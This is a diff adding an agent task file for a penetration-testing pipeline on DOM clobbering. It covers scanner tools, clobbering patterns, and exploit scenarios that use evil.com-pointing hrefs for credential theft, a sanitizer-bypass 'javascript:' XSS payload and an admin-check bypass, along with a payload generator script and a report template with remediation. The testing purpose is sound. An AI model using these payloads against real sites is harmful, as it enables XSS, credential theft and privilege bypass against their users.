@@ -1,0 +1,456 @@
+================================================================================
+TASK 58 · DOM CLOBBERING SCANNER & EXPLOITATION
+================================================================================
+Covers testing_toolkit.txt Phase 6 Step 19 (DOM Clobbering)
+Related: Prototype Pollution (Task 57)
+
+OBJECTIVE:
+- Find DOM Clobbering vulnerabilities
+- Exploit named element → window property overrides
+- Bypass security controls (sanitizers, CSP)
+- Chain with XSS or other client-side attacks
+
+================================================================================
+INPUTS
+================================================================================
+outputs/js_urls_live.txt                    ← Live JavaScript files
+outputs/xss_reflections_kxss.txt            ← Reflection points (potential clobber)
+outputs/queue_dynamic_endpoints_urls.txt    ← Parameterized URLs
+outputs/url_corpus_all_in_scope.txt         ← Full URL corpus
+outputs/xss_confirmed_dalfox.txt            ← XSS findings (chain opportunities)
+
+================================================================================
+OUTPUTS
+================================================================================
+outputs/dom_clobbering/
+├── clobber_candidates.json         ← Endpoints vulnerable to clobbering
+├── clobber_exploits.json           ← Confirmed exploitable clobbers
+├── clobber_bypass_chains.json      ← Security bypass via clobbering
+├── clobber_xss_chains.json         ← Clobber → XSS chains
+├── scan_log.txt                    ← Execution log
+└── checkpoint.json                 ← Resume state
+
+outputs/vulnerabilities/
+└── CLOBBER-XXXX-SEVERITY.md        ← Individual vulnerability reports
+
+================================================================================
+PHASE 1: UNDERSTAND DOM CLOBBERING
+================================================================================
+
+WHAT IS DOM CLOBBERING?
+───────────────────────
+HTML elements with id or name attributes create properties on `window` and
+`document`. An attacker can inject HTML to override these properties.
+
+# Example: Named element creates window property
+<img id="x">
+window.x  // Returns the <img> element!
+
+# Clobbering in action
+<a id="CONFIG" href="https://evil.com/config.json"></a>
+window.CONFIG  // Returns the <a> element
+window.CONFIG.href  // "https://evil.com/config.json"
+
+WHY IS IT DANGEROUS?
+────────────────────
+1. Override global variables used by JavaScript
+2. Bypass security checks that rely on undefined checks
+3. Inject attacker-controlled values into application logic
+4. Chain with sanitized HTML injection for XSS
+
+KEY INSIGHT:
+────────────
+DOM Clobbering works even when HTML is SANITIZED (no script tags allowed)!
+If you can inject ANY HTML element with id/name, you can clobber.
+
+================================================================================
+PHASE 2: TOOL INSTALLATION
+================================================================================
+
+───────────────────────────────────────
+2.1 TheHulk - DOM Clobbering Scanner
+───────────────────────────────────────
+# Install TheHulk
+git clone https://github.com/nicholashh/TheHulk.git
+cd TheHulk && npm install
+
+# Run
+node hulk.js --url "https://target.com"
+
+───────────────────────────────────────
+2.2 TheThing - Clobberable Property Finder
+───────────────────────────────────────
+git clone https://github.com/nicholashh/TheThing.git
+cd TheThing && npm install
+
+───────────────────────────────────────
+2.3 DOMHack - DOM Analysis Tools
+───────────────────────────────────────
+git clone https://github.com/nicholashh/DOMHack.git
+cd DOMHack && npm install
+
+───────────────────────────────────────
+2.4 Gadget Probe - Sink/Source Finder
+───────────────────────────────────────
+git clone https://github.com/nicholashh/gadget-probe.git
+
+================================================================================
+PHASE 3: DOM CLOBBERING FUNDAMENTALS
+================================================================================
+
+───────────────────────────────────────
+3.1 Basic Clobbering Patterns
+───────────────────────────────────────
+
+SINGLE PROPERTY CLOBBER:
+────────────────────────
+# Clobber window.x
+<img id="x">
+<a id="x">
+<form id="x">
+<embed id="x">
+<object id="x">
+
+# Clobber document.x
+<img name="x">
+<form name="x">
+<embed name="x">
+<object name="x">
+
+NESTED PROPERTY CLOBBER:
+────────────────────────
+# Clobber window.x.y (using form + input)
+<form id="x"><input id="y"></form>
+window.x.y  // Returns the <input> element
+
+# Clobber window.x.y (using a + a)
+<a id="x"><a id="y"></a></a>
+window.x.y  // Works in some browsers
+
+# Clobber deeper: window.x.y.z
+<form id="x"><input id="y" name="z"></form>
+window.x.y.z  // Limited depth, browser-dependent
+
+STRING VALUE CLOBBER:
+─────────────────────
+# Clobber to string value (using href/src)
+<a id="x" href="https://evil.com">
+String(window.x)  // "https://evil.com"
+window.x.toString()  // "https://evil.com"
+window.x + ""  // "https://evil.com"
+
+# Clobber with data: URL
+<a id="config" href="data:,evil_value">
+String(window.config)  // "data:,evil_value"
+
+───────────────────────────────────────
+3.2 Advanced Clobbering Techniques
+───────────────────────────────────────
+
+HTMLCOLLECTION CLOBBER:
+───────────────────────
+# Multiple elements with same id → HTMLCollection
+<a id="x"></a><a id="x"></a>
+window.x  // HTMLCollection [a, a]
+window.x[0]  // First <a>
+window.x[1]  // Second <a>
+
+# Useful for length property
+<a id="x"></a><a id="x"></a>
+window.x.length  // 2
+
+FORM ELEMENT CLOBBERING:
+────────────────────────
+# Form inputs clobber form properties
+<form id="myForm">
+    <input name="action" value="evil">
+    <input name="method" value="GET">
+</form>
+window.myForm.action  // <input> element, not form action!
+
+IFRAME CLOBBERING:
+──────────────────
+# Clobber via iframe name
+<iframe name="x" src="data:text/html,<a id='y' href='evil'></a>"></iframe>
+window.x.y  // Access cross-frame (same-origin only)
+
+================================================================================
+PHASE 4: VULNERABILITY DETECTION
+================================================================================
+
+───────────────────────────────────────
+4.1 TheHulk - Automated Scanning
+───────────────────────────────────────
+# Scan target for clobberable sinks
+node hulk.js --url "https://target.com" --output temp/agent1/hulk_results.json
+
+# Batch scanning
+cat temp/agent1/live_base_urls.txt | while read url; do
+    node hulk.js --url "$url" >> temp/agent1/hulk_batch.json 2>&1
+done
+
+───────────────────────────────────────
+4.2 TheThing - Property Analysis
+───────────────────────────────────────
+# Find clobberable properties in JS
+node thing.js --url "https://target.com" --analyze
+
+# Output: Properties accessed that could be clobbered
+# e.g., window.CONFIG, document.form1, globalSettings
+
+───────────────────────────────────────
+4.3 Manual Detection Pattern
+───────────────────────────────────────
+# Step 1: Find HTML injection point (even sanitized)
+# Step 2: Analyze target's JavaScript
+# Step 3: Find undefined checks or property access
+# Step 4: Craft clobber payload
+
+# Common patterns in JS that are clobberable:
+if (typeof CONFIG === 'undefined') { ... }
+if (!window.settings) { ... }
+var url = element || defaultUrl;
+fetch(config.apiUrl);
+
+───────────────────────────────────────
+4.4 Browser Console Testing
+───────────────────────────────────────
+# In browser DevTools, check what's clobberable:
+
+// List all window properties that could be clobbered
+Object.getOwnPropertyNames(window).filter(p => {
+    try { return window[p] === undefined; } catch(e) { return false; }
+});
+
+// Check if specific property is clobbered
+console.log(window.x);  // undefined = can be clobbered
+console.log(document.x);  // undefined = can be clobbered
+
+================================================================================
+PHASE 5: EXPLOITATION SCENARIOS
+================================================================================
+
+───────────────────────────────────────
+5.1 Security Check Bypass
+───────────────────────────────────────
+VULNERABLE CODE:
+if (typeof isAdmin === 'undefined') {
+    isAdmin = false;  // Default to false
+}
+if (isAdmin) {
+    showAdminPanel();
+}
+
+EXPLOIT:
+<a id="isAdmin" href="#">
+// Now: typeof isAdmin !== 'undefined'
+// And: isAdmin is truthy (it's an element)
+// Result: Admin panel shown!
+
+───────────────────────────────────────
+5.2 URL/Config Override
+───────────────────────────────────────
+VULNERABLE CODE:
+var apiUrl = window.API_URL || "https://api.legitimate.com";
+fetch(apiUrl + "/data");
+
+EXPLOIT:
+<a id="API_URL" href="https://evil.com">
+// Now: window.API_URL = <a> element
+// String(window.API_URL) = "https://evil.com"
+// fetch("https://evil.com/data") → credential theft!
+
+───────────────────────────────────────
+5.3 Sanitizer Bypass → XSS
+───────────────────────────────────────
+VULNERABLE CODE:
+var userContent = DOMPurify.sanitize(input);
+element.innerHTML = userContent;
+// Later...
+if (window.DEBUG) {
+    eval(window.DEBUG);  // Debugging code
+}
+
+EXPLOIT:
+// DOMPurify allows <a id="DEBUG" href="...">
+// Inject: <a id="DEBUG" href="javascript:alert(1)">
+// Clobbers window.DEBUG
+// eval() receives the <a> element → coerced to string → XSS!
+
+───────────────────────────────────────
+5.4 Script Gadget Exploitation
+───────────────────────────────────────
+Many libraries have clobberable gadgets:
+
+# Google Tag Manager
+<a id="google_tag_manager">
+<a id="dataLayer">
+
+# Analytics
+<a id="ga">
+<a id="_gaq">
+
+# jQuery
+<a id="jQuery">
+<form id="$"></form>
+
+# RequireJS
+<a id="require">
+<a id="define">
+
+================================================================================
+PHASE 6: TOOL-BASED EXPLOITATION
+================================================================================
+
+───────────────────────────────────────
+6.1 DOMHack - Automated Exploitation
+───────────────────────────────────────
+# Generate exploit payloads
+node domhack.js --url "https://target.com" --property "CONFIG" --value "https://evil.com"
+
+# Output: Minimal HTML to clobber CONFIG to desired value
+
+───────────────────────────────────────
+6.2 Gadget Probe - Find Library Gadgets
+───────────────────────────────────────
+# Scan for known library gadgets
+node gadget-probe.js --url "https://target.com"
+
+# Known gadgets database includes:
+# - jQuery, Lodash, Underscore
+# - Angular, React, Vue
+# - Google Analytics, GTM
+# - Various CDN libraries
+
+───────────────────────────────────────
+6.3 Manual Payload Generation
+───────────────────────────────────────
+#!/bin/bash
+# clobber_payload.sh - Generate clobber payloads
+
+PROPERTY="$1"
+VALUE="$2"
+
+# Single property
+echo "<a id=\"${PROPERTY}\" href=\"${VALUE}\">"
+
+# Nested property (x.y)
+IFS='.' read -r prop1 prop2 <<< "$PROPERTY"
+if [ -n "$prop2" ]; then
+    echo "<form id=\"${prop1}\"><input id=\"${prop2}\" value=\"${VALUE}\"></form>"
+fi
+
+================================================================================
+PHASE 7: DETECTION IN JAVASCRIPT FILES
+================================================================================
+
+───────────────────────────────────────
+7.1 Dangerous Patterns to Search
+───────────────────────────────────────
+# Download JS files
+for url in $(cat outputs/js_urls_live.txt | head -100); do
+    curl -s "$url" >> temp/agent1/js_for_clobber_analysis.txt
+done
+
+# Search for vulnerable patterns
+grep -E "window\.\w+\s*\|\||typeof\s+\w+\s*===?\s*['\"]undefined['\"]|document\.\w+\s*\|\|" \
+    temp/agent1/js_for_clobber_analysis.txt > temp/agent1/clobber_candidates.txt
+
+# Pattern explanations:
+# window.x ||          → Uses x if defined, can be clobbered
+# typeof x === 'undefined'  → Undefined check, can bypass with clobber
+# document.x ||        → Uses document.x, can be clobbered
+
+───────────────────────────────────────
+7.2 Sink Analysis
+───────────────────────────────────────
+# Find sinks that use potentially clobbered values
+grep -E "eval\(|innerHTML|outerHTML|document\.write|location\s*=|\.src\s*=|\.href\s*=|fetch\(|XMLHttpRequest" \
+    temp/agent1/js_for_clobber_analysis.txt > temp/agent1/clobber_sinks.txt
+
+================================================================================
+PHASE 8: OUTPUT CONSOLIDATION
+================================================================================
+
+───────────────────────────────────────
+8.1 Merge Tool Outputs
+───────────────────────────────────────
+# Consolidate findings
+cat temp/agent1/hulk_results.json \
+    temp/agent1/thing_results.json \
+    2>/dev/null > outputs/dom_clobbering/all_findings.json
+
+# Extract confirmed vulnerabilities
+jq 'select(.exploitable == true)' outputs/dom_clobbering/all_findings.json \
+    > outputs/dom_clobbering/clobber_exploits.json
+
+───────────────────────────────────────
+8.2 Create Vulnerability Reports
+───────────────────────────────────────
+For each confirmed clobbering vulnerability:
+
+# outputs/vulnerabilities/CLOBBER-0001-HIGH.md
+## DOM Clobbering → XSS
+
+**Severity:** HIGH
+**URL:** https://target.com/page
+**Clobbered Property:** window.CONFIG
+**Impact:** XSS via config URL override
+
+### POC
+Inject HTML: `<a id="CONFIG" href="javascript:alert(1)">`
+Triggers XSS when page accesses window.CONFIG
+
+### Remediation
+- Use local variables instead of global properties
+- Validate property types before use
+- Use Object.hasOwnProperty() checks
+
+================================================================================
+🧠 YOU ARE AN INTELLIGENT AGENT 🧠
+================================================================================
+DOM Clobbering requires understanding JavaScript code flow.
+
+ANALYZE THE CODE:
+1. What global/window properties does the code access?
+2. Are there undefined checks that can be bypassed?
+3. Where do clobbered values flow? (sinks)
+4. Can sanitized HTML reach the page?
+
+COMMON VULNERABLE PATTERNS:
+- `if (!window.x)` → Clobber x to truthy element
+- `var url = config || default` → Clobber config
+- `typeof x === 'undefined'` → Clobber x to bypass
+
+REMEMBER:
+- Clobbering works with SANITIZED HTML
+- DOMPurify allows id and name attributes by default
+- Values are ELEMENTS, not strings (coercion matters)
+- Browser differences affect what's clobberable
+
+THINK CHAINS:
+- HTML injection → Clobber → Bypass → XSS
+- Sanitizer passes HTML → Clobber window property → XSS sink
+
+PRIORITIZE:
+1. Pages with HTML injection (comments, profiles, rich text)
+2. Pages using global configuration objects
+3. Pages with complex JS frameworks
+4. Admin/authenticated pages (higher impact)
+
+================================================================================
+SUCCESS CRITERIA
+================================================================================
+✓ JavaScript files analyzed for clobberable properties
+✓ HTML injection points tested for clobbering
+✓ Security bypass chains identified
+✓ XSS chains via clobbering documented
+✓ Vulnerability reports with POC generated
+✓ Remediation recommendations provided
+
+================================================================================
+RELATED TASKS
+================================================================================
+← Task 57: Prototype Pollution (different mechanism, similar impact)
+← Task 54-56: XSS Tasks (clobbering can chain to XSS)
+→ Task 59+ (future): Other client-side attacks
